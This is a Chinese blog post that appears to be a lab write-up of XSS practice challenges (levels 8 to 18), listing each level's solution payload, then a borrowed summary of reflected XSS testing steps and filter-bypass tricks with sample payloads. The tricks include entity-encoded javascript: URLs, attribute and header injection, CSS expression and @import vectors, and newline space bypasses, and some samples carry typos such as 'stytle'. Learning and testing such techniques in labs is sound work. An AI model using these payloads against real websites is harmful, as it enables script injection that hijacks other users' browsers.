---
title: xss-跨站脚本攻击2
author: Troye.
avatar: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20160708223941_YQncj.jpeg
authorLink: 
authorAbout: 
authorDesc: 
categories: 技术
comments: true
date: 2020-02-15 00:07:09
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/705101.jpg
---
注：答案前的//请忽略。
level8：首先看一下代码。这道题是添加一个东西会显示在这里：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215001835.png)
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215001844.png)
所以很明显是添加JavaScript:alert(‘1’),但是javascript被替换了。所以这里用老办法是不行的。要把代码转换为html字符实体，这样在执行的时候还是会转换回原来的字符，也就成功的绕过了。
level9：这里无论添加什么下面的那行字都不会改变，实在是搞不明白，请教了百度，才知道这里要添加一个合法的地址。其他的和level8相同。一种答案：
//javascrip&#106;:alert(‘1’)//http://www.baidu.com
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002032.png)
level10：又是新的类型，找不到注入点。仔细查看源码发现了这个：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002119.png)
百度得知这是隐藏的表单，要提交到这三个变量中，但前两个都是不行的，只有提交给t_sort才会成功注入。
//keyword=1&t_sort= "type="text" onclick="alert(1)
注：type="text"是构造一个文本框以来触发onclick
level11：这关自己搞不定了，主要是没见过不知道怎么下手。可以看到我上一关输入的东西：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002220.png)
方法是修改http请求头：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002508.png)
就是不知道这怎么看出来是一个注入点的？
level12：这一关看到了useragent：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002613.png)
那么参考上一关的思路，这一关的注入点就在这里了。
修改user-agent：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002656.png)
level13：此关根据多出来的变量t-cook以及里面的提示call me maybe？和http头里cookie的代码极其相似，可以判断要修改cookie：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002744.png)
level14：又看不懂了……不过好像下面的链接失效了，无法进行测试，先跳过吧。
level15：首先分析源码：
![avatar](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200215002823.png)
注：ng-include 指令用于包含外部的 HTML 文件。
包含的内容将作为指定元素的子节点。
ng-include 属性的值可以是一个表达式，返回一个文件名。
默认情况下，包含的文件需要包含在同一个域名下。
根据源代码判断，变量src存在注入点。
后面都是模仿大佬的操作了。
ng-include本地文件包含，调用本地有xss漏洞的文件，触发xss。
//src='level1.php?name=<img src=x onerror=alert(1)>'
level16：根据大佬提示，这一关对script、/、空格进行了转换，并且因为没有文本框要用到type=text。由于空格被替换，这里可以用换行符%0a或者回车符%0d绕过
//keyword=<a%0Atype="text"%0Aonclick="alert(1)">
level17：查看源码，发现只有embed标签可以利用:
//arg01=a&arg02= onmouseover=alert()
注：这里要用ie浏览器，火狐不支持swf。
level18：和上一关一样即可
level19和level20因为网上找不到提示并且火狐和ie浏览器好像都没法测试就放弃了。

下面放一些大佬的总结：
反射型XSS测试步骤总结：
1.检测输入变量，确认每个web页面中用户可自定义的变量，如HTTP参数、POST数据、隐藏表单字段值、预定义的radio值或选择值
2.分别确认每个输入变量是否存在xss漏洞。变量输入处输入poc，查看返回的web页面的html中poc代码是否被过滤，浏览器是否响应poc，若存在过滤，进行测试查看能否进行绕过。
xss的攻防：
1.利用<>标记，构造<script>标签可执行javascript的xss代码。
xss过滤函数需过滤<><script></script>等字符。
2.利用html标签属性支持javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。
xss 过滤函数需过滤JavaScript等关键字。
3.利用javascript在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对javascript的关键字的过滤。
4.利用html标签属性值支持ascii码，对标签属性值进行转码进行规则库的绕过。
xss 过滤函数需过滤&#\等字符。
5.利用事件处理函数，触发事件，执行xss代码。例如<img src='#' onerror=alert(/xss/)>,当浏览器响应页面时，找不到图片的地址，触发onerror事件。
6.利用css执行javascript代码
css代码中利用expression触发xss漏洞。如下所示：
//<div style="width: expression(alert('xss'));>
//<img src="#" style="xss:expression(alert(/xss/));">
//<style>body {background-image:expression(alert("xss"));}</style>
//<div style="list-style-image:url(javascript:alert('xss'))">
css代码中利用@import触发xss
//<stytle>
//@import 'javascript:alert("XSS")';
//</stytle>
css代码中使用@import和link方式导入外部含有xss代码的样式表文件
//<link rel="stytlesheet" href="http://www.***.com/a.css">
//<stytle 
//type='text/css'>@import url(http://www.*.com/a.css);
//</style>
xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字。
7.利用大小写混淆、使用单引号、不使用引号、使用/插入在img src中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数
8.利用字符编码。javascript支持unicode、escapes、十六进制、八进制等编码形式。




